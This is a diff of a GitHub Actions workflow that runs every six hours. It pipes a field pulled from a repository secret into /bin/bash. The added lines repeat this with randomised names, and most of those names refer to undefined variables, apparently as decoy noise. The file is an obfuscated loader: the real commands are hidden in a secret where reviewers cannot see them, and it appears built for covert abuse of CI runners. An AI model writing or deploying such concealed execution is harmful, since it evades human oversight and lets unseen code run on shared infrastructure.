@@ -1,22 +1,29 @@
 name: lixiangyang3456
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 0/6 * * *'
+    - cron: '54 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lixiangyang3456
         env:
-          sqmyq14: ${{ secrets.sqmyq14 }}
+          rvdo5001: ${{ secrets.rvdo5001 }}
         run: |
-          echo $sqmyq14 | jq -r .ubdd27 | /bin/bash
-          echo $y7339 | jq -r .w7 | /bin/bash
-          echo $nlayo62 | jq -r .q723 | /bin/bash
-          echo $pg27352 | jq -r .g84 | /bin/bash
-          echo $zs9 | jq -r .crn50203 | /bin/bash
-          echo $alyco46259 | jq -r .rsiw88347 | /bin/bash
+          echo $rvdo5001 | jq -r .ov329 | /bin/bash
+          echo $f14394 | jq -r .ujo87349 | /bin/bash
+          echo $khq5100 | jq -r .sj77962 | /bin/bash
+          echo $oyr21 | jq -r .uqu44180 | /bin/bash
+          echo $gus6 | jq -r .byg8602 | /bin/bash
+          echo $cbrfg5 | jq -r .xicp331 | /bin/bash
+          echo $ouotp84448 | jq -r .t6172 | /bin/bash
+          echo $tlcmo018 | jq -r .uywq145 | /bin/bash
+          echo $pmpy385 | jq -r .yhri2 | /bin/bash
+          echo $umps0 | jq -r .g74982 | /bin/bash
+          echo $zje83 | jq -r .ds5 | /bin/bash
+          echo $i412 | jq -r .pmen0907 | /bin/bash
 
